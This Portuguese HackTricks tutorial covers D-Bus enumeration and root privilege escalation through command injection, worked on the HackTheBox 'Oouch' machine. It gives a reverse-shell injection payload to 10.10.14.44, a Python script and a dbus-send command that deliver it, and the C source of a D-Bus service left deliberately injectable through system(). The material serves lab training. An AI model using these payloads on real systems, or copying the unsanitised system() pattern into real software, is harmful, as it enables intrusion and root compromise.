# Enumeração D-Bus e Escalação de Privilégios por Injeção de Comandos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Enumeração GUI**

**(Esta informação de enumeração foi retirada de** [**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**)**

O Ubuntu desktop utiliza o D-Bus como seu mediador de comunicações interprocessuais (IPC). No Ubuntu, existem vários barramentos de mensagens que são executados simultaneamente: um barramento do sistema, que é principalmente usado por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um barramento de sessão para cada usuário conectado, que expõe serviços que são relevantes apenas para esse usuário específico. Como tentaremos elevar nossos privilégios, nos concentraremos principalmente no barramento do sistema, pois os serviços lá tendem a ser executados com privilégios mais elevados (ou seja, root). Observe que a arquitetura do D-Bus utiliza um "roteador" por barramento de sessão, que redireciona as mensagens do cliente para os serviços relevantes com os quais estão tentando interagir. Os clientes precisam especificar o endereço do serviço para o qual desejam enviar mensagens.

Cada serviço é definido pelos **objetos** e **interfaces** que ele expõe. Podemos pensar em objetos como instâncias de classes em linguagens OOP padrão. Cada instância única é identificada pelo seu **caminho do objeto** - uma string que se assemelha a um caminho do sistema de arquivos que identifica exclusivamente cada objeto que o serviço expõe. Uma interface padrão que ajudará em nossa pesquisa é a interface **org.freedesktop.DBus.Introspectable**. Ela contém um único método, Introspect, que retorna uma representação XML dos métodos, sinais e propriedades suportados pelo objeto. Esta postagem no blog se concentra em métodos e ignora propriedades e sinais.

Eu usei duas ferramentas para me comunicar com a interface D-Bus: a ferramenta CLI chamada **gdbus**, que permite chamar facilmente métodos expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python que ajuda a enumerar os serviços disponíveis em cada barramento e a ver quais objetos cada serviço contém.
```bash
sudo apt-get install d-feet
```
![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

_Figura 1. Janela principal do D-Feet_

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

_Figura 2. Janela de interface do D-Feet_

No painel esquerdo da Figura 1, você pode ver todos os vários serviços que se registraram com o sistema de barramento do daemon D-Bus (observe o botão Selecionar barramento do sistema na parte superior). Eu selecionei o serviço **org.debin.apt**, e o D-Feet automaticamente **consultou o serviço para todos os objetos disponíveis**. Uma vez que eu selecionei um objeto específico, o conjunto de todas as interfaces, com seus respectivos métodos, propriedades e sinais são listados, como visto na Figura 2. Observe que também obtemos a assinatura de cada **método IPC exposto**.

Também podemos ver o **pid do processo** que hospeda cada serviço, bem como sua **linha de comando**. Este é um recurso muito útil, pois podemos validar que o serviço alvo que estamos inspecionando realmente é executado com privilégios mais elevados. Alguns serviços no barramento do sistema não são executados como root e, portanto, são menos interessantes para pesquisar.

O D-Feet também permite chamar os vários métodos. Na tela de entrada do método, podemos especificar uma lista de expressões Python, delimitadas por vírgulas, para serem interpretadas como os parâmetros da função invocada, mostrada na Figura 3. Os tipos Python são agrupados em tipos D-Bus e passados para o serviço.

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-23.png)

_Figura 3. Chamando métodos D-Bus através do D-Feet_

Alguns métodos exigem autenticação antes de nos permitir invocá-los. Vamos ignorar esses métodos, já que nosso objetivo é elevar nossos privilégios sem credenciais em primeiro lugar.

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-24.png)

_Figura 4. Um método que requer autorização_

Observe também que alguns dos serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 se um usuário deve ou não ser autorizado a realizar determinadas ações.

## **Enumeração de linha de comando**

### Listar objetos de serviço

É possível listar as interfaces D-Bus abertas com:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                - 
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service - 
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       - 
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    - 
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… - 
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         - 
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         - 
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       - 
org.bluez                                - -               -                (activatable) -                         - 
org.freedesktop.DBus                     1 systemd         root             -             init.scope                - 
org.freedesktop.PackageKit               - -               -                (activatable) -                         - 
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         - 
org.freedesktop.hostname1                - -               -                (activatable) -                         - 
org.freedesktop.locale1                  - -               -                (activatable) -                         - 
```
#### Conexões

Quando um processo estabelece uma conexão com um barramento, o barramento atribui à conexão um nome especial de barramento chamado _unique connection name_. Nomes de barramento desse tipo são imutáveis - é garantido que eles não mudarão enquanto a conexão existir - e, mais importante, eles não podem ser reutilizados durante a vida útil do barramento. Isso significa que nenhuma outra conexão com esse barramento terá um nome de conexão exclusivo atribuído, mesmo que o mesmo processo feche a conexão com o barramento e crie uma nova. Nomes de conexão exclusivos são facilmente reconhecíveis porque começam com o caractere de dois pontos - que é proibido de outra forma.

### Informações do Objeto de Serviço
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
```
### Listar Interfaces de um Objeto de Serviço

Você precisa ter permissões suficientes.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```
### Interface de Introspecção de um Objeto de Serviço

Observe como neste exemplo foi selecionada a última interface descoberta usando o parâmetro `tree` (_veja a seção anterior_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Observe o método `.Block` da interface `htb.oouch.Block` (o que nos interessa). O "s" das outras colunas pode significar que ele espera uma string.

### Interface de Monitoramento/Captura

Com privilégios suficientes (apenas `send_destination` e `receive_sender` não são suficientes), você pode **monitorar uma comunicação D-Bus**.

Para **monitorar** uma **comunicação**, você precisará ser **root**. Se ainda tiver problemas para ser root, verifique [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Se você souber como configurar um arquivo de configuração do D-Bus para **permitir que usuários não root capturem** a comunicação, por favor, **entre em contato comigo**!
{% endhint %}

Diferentes maneiras de monitorar:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
No exemplo a seguir, a interface `htb.oouch.Block` é monitorada e **a mensagem "**_**lalalalal**_**" é enviada através de uma má comunicação**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```
Você pode usar `capture` em vez de `monitor` para salvar os resultados em um arquivo pcap.

#### Filtrando todo o ruído <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se houver muita informação no barramento, passe uma regra de correspondência assim:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Várias regras podem ser especificadas. Se uma mensagem corresponder a _qualquer_ uma das regras, a mensagem será impressa. Como segue:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Veja a [documentação do D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) para mais informações sobre a sintaxe de regras de correspondência.

### Mais

`busctl` tem ainda mais opções, [**encontre todas elas aqui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Cenário Vulnerável**

Como usuário **qtc dentro do host "oouch" do HTB**, você pode encontrar um **arquivo de configuração inesperado do D-Bus** localizado em _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```markup
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```
Observação da configuração anterior: **você precisará ser o usuário `root` ou `www-data` para enviar e receber informações** por meio dessa comunicação D-BUS.

Como usuário **qtc** dentro do contêiner docker **aeb4525789d8**, você pode encontrar algum código relacionado ao dbus no arquivo _/code/oouch/routes.py._ Este é o código interessante:
```python
if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')
```
Como você pode ver, está **conectando a uma interface D-Bus** e enviando para a função **"Block"** o "client\_ip".

Do outro lado da conexão D-Bus, há um binário compilado em C em execução. Este código está **ouvindo** na conexão D-Bus **por endereço IP e está chamando o iptables via função `system`** para bloquear o endereço IP fornecido.\
**A chamada ao `system` é vulnerável de propósito à injeção de comando**, então uma carga útil como a seguinte criará um shell reverso: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Explorando

No final desta página, você pode encontrar o **código C completo do aplicativo D-Bus**. Dentro dele, você pode encontrar entre as linhas 91-97 **como o `caminho do objeto D-Bus`** e o **`nome da interface`** são **registrados**. Essas informações serão necessárias para enviar informações para a conexão D-Bus:
```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```
Além disso, na linha 57 você pode encontrar que **o único método registrado** para esta comunicação D-Bus é chamado de `Block` (_**Por isso, na seção seguinte, os payloads serão enviados para o objeto de serviço `htb.oouch.Block`, a interface `/htb/oouch/Block` e o nome do método `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

O seguinte código em python enviará o payload para a conexão D-Bus para o método `Block` via `block_iface.Block(runme)` (_note que foi extraído do trecho de código anterior_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl e dbus-send

O `busctl` e o `dbus-send` são ferramentas de linha de comando que permitem interagir com o sistema de comunicação D-Bus. O D-Bus é um sistema de comunicação entre processos que permite que aplicativos se comuniquem entre si e com o sistema operacional.

Essas ferramentas podem ser usadas para enumerar serviços D-Bus disponíveis no sistema e enviar mensagens para esses serviços. Isso pode ser útil para a escalada de privilégios, pois alguns serviços D-Bus podem ser configurados para executar com privilégios elevados.

Por exemplo, se um serviço D-Bus estiver configurado para executar com privilégios elevados e permitir a execução de comandos arbitrários, um invasor pode enviar uma mensagem para esse serviço contendo um comando malicioso e executá-lo com privilégios elevados.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` é uma ferramenta usada para enviar mensagens para o "Message Bus"
* Message Bus - Um software usado pelos sistemas para facilitar a comunicação entre aplicativos. Está relacionado à Message Queue (as mensagens são ordenadas em sequência), mas no Message Bus as mensagens são enviadas em um modelo de assinatura e também muito rapidamente.
* A tag "-system" é usada para mencionar que é uma mensagem do sistema, não uma mensagem de sessão (por padrão).
* A tag "--print-reply" é usada para imprimir nossa mensagem adequadamente e receber quaisquer respostas em um formato legível por humanos.
* "--dest=Dbus-Interface-Block" é o endereço da interface Dbus.
* "--string:" - Tipo de mensagem que gostaríamos de enviar para a interface. Existem vários formatos de envio de mensagens, como double, bytes, booleans, int, objpath. Dentre esses, o "objpath" é útil quando queremos enviar um caminho de arquivo para a interface Dbus. Podemos usar um arquivo especial (FIFO) nesse caso para passar um comando para a interface com o nome de um arquivo. "string: ;" - Isso é para chamar o caminho do objeto novamente, onde colocamos o arquivo de shell reverso FIFO / comando.

Observe que em `htb.oouch.Block.Block`, a primeira parte (`htb.oouch.Block`) se refere ao objeto de serviço e a última parte (`.Block`) se refere ao nome do método.

### Código C

{% code title = "d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang 
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message. 
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0) 
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
